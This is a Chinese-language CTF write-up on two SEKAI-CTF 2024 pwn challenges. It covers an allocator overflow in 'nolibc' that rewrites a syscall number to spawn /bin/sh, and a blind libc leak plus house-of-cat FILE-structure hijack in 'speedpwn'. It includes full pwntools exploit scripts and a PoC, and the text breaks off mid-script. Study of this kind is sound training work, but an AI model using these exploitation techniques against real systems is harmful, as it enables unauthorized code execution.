---
title: 2024 SEKAI-CTF（nolibc speedpwn life_simulator_2）
url: https://forum.butian.net/share/3749
source: 奇安信攻防社区
date: 2024-09-11
fetch_date: 2025-10-06T18:23:29.032726
---

# 2024 SEKAI-CTF（nolibc speedpwn life_simulator_2）

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 2024 SEKAI-CTF（nolibc speedpwn life\_simulator\_2）

* [CTF](https://forum.butian.net/topic/52)

2024 SEKAI-CTF（nolibc speedpwn life\_simulator\_2）

nolibc
======
```bash
[!] Did not find any GOT entries
[\*] '/home/llk/Desktop/pwn/sekaictf/nolibc/main'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: PIE enabled
```
检查保护感觉是溢出，只能注册一个账户并登录该账户
可以通过data段残留的pie地址泄露pie 后来Nightu师傅说可以直接读文件的，被自己蠢哭了
后来tplus师傅是利用size是buffer长度不是整个chunk，可以溢出改系统调用号，当时也想过，但当时源码没逆太懂，后来逆懂了后确实存在一个很明显的洞
```c
char \*\_\_fastcall alloc(int size)
{
struct chunk \*next\_use\_chunk; // [rsp+4h] [rbp-20h]
signed int up\_align\_16\_size; // [rsp+10h] [rbp-14h]
struct chunk \*v4; // [rsp+14h] [rbp-10h]
struct chunk \*v5; // [rsp+1Ch] [rbp-8h]
if ( !size )
return 0LL;
up\_align\_16\_size = (size + 15) & 0xFFFFFFF0;
v5 = next\_use\_chunk\_ptr;
v4 = 0LL;
while ( 1 )
{
if ( !v5 )
return 0LL;
if ( up\_align\_16\_size <= v5->size )
break;
v4 = v5;
v5 = v5->next\_use\_chunk;
}
if ( v5->size >= (unsigned \_\_int64)(up\_align\_16\_size + 16LL) )
{
next\_use\_chunk = (struct chunk \*)&v5->buff[up\_align\_16\_size];
next\_use\_chunk->size = v5->size - up\_align\_16\_size - 16;
next\_use\_chunk->next\_use\_chunk = v5->next\_use\_chunk;
v5->next\_use\_chunk = next\_use\_chunk;
v5->size = up\_align\_16\_size;
}
if ( v4 )
v4->next\_use\_chunk = v5->next\_use\_chunk;
else
next\_use\_chunk\_ptr = v5->next\_use\_chunk;
return v5->buff;
}
```
首先会根据`next\_use\_chunk`找到一个size大于等于`up\_align\_16\_size`的use\\_chunk\\_ptr，如果找到的use\\_chunk\\_ptr就是当前的next\\_use\\_chunk\\_ptr 一开始的（第一个可以被使用的chunk），就会直接更新`next\_use\_chunk\_ptr = v5->next\_use\_chunk;`，并且会根据`v5->size >= (unsigned \_\_int64)(up\_align\_16\_size + 16LL)`size是否大于等于当前chunk的总长度来决定是否要分割（大于等于意味着分为后至少还有剩余的0x10部分可以作为chunk\\_header），如果只满足size大于等于`up\_align\_16\_size`此时会迭代`next\_use\_chunk\_ptr = v5->next\_use\_chunk;`（不能分割，说明当前正好合适）
由于最高next\\_use\\_chunk的size是剩余长度，而不是buff长度，而原来比较都是buffer长度，所以会将剩余长度认为是buffer长度，当剩余长度为0x10,此时如果分配0x20会溢出0x10个字节
注意分配的size是输入的`len+0x10& 0xFFFFFFF0`,然后输入内容的长度是`len+1`,这样输入的内容只能填溢出的那一个字节，但通过`len=0x xxxf`可以避免
exp
---
```python
from pwn import \*
p=process("./main")
context(os="linux",arch="amd64",log\_level="debug")
p.sendlineafter(b"Choose an option: ",str(2))
p.sendlineafter(b"Username: ",b"llk")
p.sendlineafter(b"Password: ",b"1010")
p.sendlineafter(b"Choose an option: ",str(1))
p.sendlineafter(b"Username: ",b"llk")
p.sendlineafter(b"Password: ",b"1010")
def add(length,content):
p.sendlineafter(b"Choose an option: ",str(1))
p.sendlineafter(b"Enter string length: ",str(length))
p.sendlineafter(b"Enter a string: ",content)
def dele(index):
p.sendlineafter(b"Choose an option:",str(2))
p.sendlineafter(b"Enter the index of the string to delete: ",str(index))
def show():
p.sendlineafter(b"Choose an option:",str(3))
def save(filename):
p.sendlineafter(b"Choose an option:",str(4))
p.sendlineafter(b"Enter the filename: ",filename)
def load(filename):
p.sendlineafter(b"Choose an option:",str(5))
p.sendlineafter(b"Enter the filename: ",filename)
# load("/proc/self/maps")
# show()
# leak=p.recv(timeout=2)
# print("[+] leak------------------------")
for i in range(191):
add((int("0xe0", 16)),"llk")
# gdb.attach(p)
add((int("0x7f", 16)),0x70\*b"a"+p32(0)+p32(1)+p32(59)+p32(3))
# pause()
for i in range(191):
dele(i)
# pause()
load(b"/bin/sh\x00")
p.interactive()
```
speedpwn
========
```bash
[\*] '/home/llk/Desktop/pwn/sekaictf/speedpwn/chall'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: No PIE (0x400000)
```
记得.gdbinit要有`set disable-randomization off`
```c
unsigned long long game\_history;
unsigned long long seed;
FILE \*seed\_generator;
……
if(cmp(player\_num, bot\_num)) {
puts("You win!");
\*((unsigned long long\*)&game\_history + (number\_of\_games / 64)) |= ((unsigned long long)1 << (number\_of\_games % 64));
}
else {
puts("Bot wins!");
\*((unsigned long long\*)&game\_history + (number\_of\_games / 64)) &= (~((unsigned long long)1 << (number\_of\_games % 64)));
}
```
明显的game\\_history溢出可以往高地址处bss任意写，可以发送全为1来设置对应game\\_history相应位为1，为0来设置对应game\\_history相应位为0
溢出改seed\\_generator文件结构体，但是没有地址泄露，想通过栈的残留libc泄露，但发现变量都被输入赋值了请教eurus师傅说是通过scanf输入 - 不会改变残留libc，从而libc泄露，没想到scanf输入 - 不会改变残留libc，自己还是太菜了
应该是调用libc函数在栈帧上残留的libc地址，然后通过simulate中的cmp爆破，每次simulate残留的栈帧都一样
利用残留libc低20位和最高4位不变来爆破（我在ubuntu22.04上跑是这样的，但好像别的师傅的wp都是低12位,但爆破原理都是一样的）
最低libc位为0，所以从低位往高位填比特位1当长度相等时候，此时返回0，而不是1，从而得到比特位1的个数
- 长度：最低libc位为0，所以从低位往高位填比特位1当长度相等时候，此时返回0，而不是1，从而得到比特位1的个数
- 比特位，通过爆破中间的24位，从低至高比特位设1爆破规则如下
```c
libc\_midd\_24 player\_midd\_24
…… ……
0 0
1 0
0 0
0 0
0/1 1 -> 为1相等往高位遍历时由于不相等然后&后一定返回1，为0不相等则返回0
```
想改got表，但没有函数可以控制参数，并且seed\\_generator只能改一次，所以想通过IO劫持控制流然后getshell，因为无法修改seed\\_generator的文件结构体，所以利用越界写bss来伪造文件结构体，然后再打IO
IO的house of cat的poc
```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
size\_t getlibc()
{
puts("getlibc");
size\_t result=&puts-0x75b30;
return result;
}
unsigned long long seed;
FILE \*seed\_generator;
size\_t fake\_io[0x100];
int main()
{
setvbuf(stdout, NULL, \_IONBF, 0);
size\_t libc\_base=getlibc();
printf("libc base %p",libc\_base);
seed\_generator = fopen("/dev/urandom", "r");
fread((char\*)&seed, 1, 8, seed\_generator);
fake\_io[0]=0x3b687320; //will cover content that lock point with 1
fake\_io[0x20/8]=0; //write\_base
fake\_io[0x28/8]=1; //write\_ptr
fake\_io[0xa0/8]=fake\_io; //\_wide\_data
fake\_io[0x18/8]=0; //\_wide\_data->\_IO\_write\_base
fake\_io[0x30/8]=0; //\_wide\_data->\_IO\_buf\_base
fake\_io[0xe0/8]=fake\_io; // \_wide\_data->\_\_wide\_vtable 0xe0
fake\_io[0x68/8]=libc\_base+0x4e720; //system
fake\_io[0x88/8]=fake\_io+0x100/8; // attention fake\_io is long\* , lock address can be write [fake\_io+8]==0
fake\_io[0xc0/8]=0; //mode
fake\_io[0xd8/8]=libc\_base+0x1d2648-40; //\_IO\_wfile\_jumps-40
seed\_generator=fake\_io;
fread((char\*)&seed, 1, 8, seed\_generator);
}
```
exp
---
```python
from pwn import \*
p=process("./chall")
def set\_1():
p.sendlineafter(b"> ",str("f"))
p.sendlineafter(b"Player plays: ",str(18446744073709551615))
def set\_0():
p.sendlineafter(b"> ",str("f"))
p.sendlineafter(b"Player plays: ",str(0))
def simulate(bot,play):
p.sendlineafter(b"> ",str("s"))
p.sendlineafter(b"Bot number: ",str(bot))
p.sendlineafter(b"Player number: ",str(play))
libc=0x7000000955c2
leak\_1bit\_number\_libc=0x7000000955c2+1
num=1
for i in range(48,64):
tmp=leak\_1bit\_number\_libc
tmp=tmp|1<<i
simulate("-",tmp)
result=p.recvuntil(b"!")
if b"Bot win!" in result:
num=num+1
leak\_1bit\_number\_libc=leak\_1bit\_number\_libc|1<<i
if b"You win!" in result:
num=num+1
leak\_1bit\_number\_libc=(leak\_1bit\_number\_libc-1)|1<<i |1<<(i+1)
print("1bit\_num",num)
break
use\_num=0
libc=leak\_1bit\_number\_libc
max\_num=num
for i in range(20,44):
if use\_num==max\_num-1:
tmp=libc
tmp=tmp&~(1<<44)
print("& libc",hex(tmp))
tmp=tmp|1<<i
print("try libc",hex(tmp))
simulate("-",tmp)
result=p.recvuntil(b"!")
if b"Bot win!" in result:
print("leak finish")
libc=tmp|(1<<44)
libc=libc&~(1<<(use\_num+48))
break
continue
tmp=libc
tmp=tmp&~(1<<(use\_num+48))
print("& libc",hex(tmp))
tmp=tmp|1<<i
print("try libc",hex(tmp))
simulate("-",tmp)
result=p.recvuntil(b"!")
if b"Bot win!" in result:
print("success libc bit",hex(tmp))
libc=tmp
use\_num=use\_num+1
libc\_base=libc-0x955c2
def ...